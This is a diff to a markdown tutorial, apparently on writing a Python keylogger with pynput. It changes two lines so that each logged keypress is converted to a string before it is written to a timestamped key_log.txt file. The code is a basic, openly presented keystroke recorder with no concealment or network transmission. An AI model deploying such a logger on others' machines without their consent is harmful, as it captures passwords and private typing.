@@ -49,7 +49,7 @@ Then create a definition for keypresses called on_press which takes key as a par
 
 ```python
 def on_press(key):
-    logging.info(key)
+    logging.info(str(key))
 ```
 
 Next setup an instance of Listener and define the on_press method in a with statement and then join the instance to the main thread.
@@ -89,7 +89,7 @@ log_dir = ""
 logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 def on_press(key):
-    logging.info(key)
+    logging.info(str(key))
 
 with Listener(on_press=on_press) as listener:
     listener.join()
